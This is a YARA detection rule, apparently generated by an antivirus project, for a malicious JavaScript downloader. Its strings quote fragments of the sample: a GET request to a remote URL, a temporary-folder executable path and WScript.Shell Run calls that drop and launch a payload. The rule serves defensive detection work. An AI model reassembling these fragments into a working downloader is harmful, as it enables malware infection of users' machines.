rule sig_20160329_f33cdf4c9b3eae14ed657c7904f2108e {
  meta:
    description = "datamaliciousorder - file 20160329_f33cdf4c9b3eae14ed657c7904f2108e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "52cd04fd21c0816ea17f8346003243a206f87b3bf6ee82787bf3ea40ef8f7f80"

  strings:
    $s1  = "Xo[k](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function HX() {return t[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2rkBom78eETGxmL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Xg](UU() * 11); if (Xo[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var t = function O() {return WScript[U](\"WScript.Shell\");}(), G = 11;" fullword ascii
    $s5  = "function TK(wn, BG){I = I * 1; return wn - BG;};" fullword ascii
    $s6  = "function a(){return \"\" + o;};" fullword ascii
    $s7  = "function M() {return ((M0 == true) && (M0 == O0)) ? 1 : I;};" fullword ascii
    $s8  = "function e(K){t[\"Run\"](K, I, I);};" fullword ascii
    $s9  = " while (X){" fullword ascii
    $s10 = "function g(){return U;};" fullword ascii
    $s11 = "var W = new this[\"Date\"]();" fullword ascii
    $s12 = "function UU(){return 22;};" fullword ascii
    $s13 = "function Is(i) {var Tw = (1, 2, 3, 4, 5, i); return Tw;};" fullword ascii
    $s14 = "return TK(W0, s);" fullword ascii
    $s15 = "function qK()" fullword ascii
    $s16 = "var O0 = false;" fullword ascii
    $s17 = "O0 = true; " fullword ascii
    $s18 = "var nm = false;" fullword ascii
    $s19 = "M0 = true; " fullword ascii
    $s20 = "var M0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}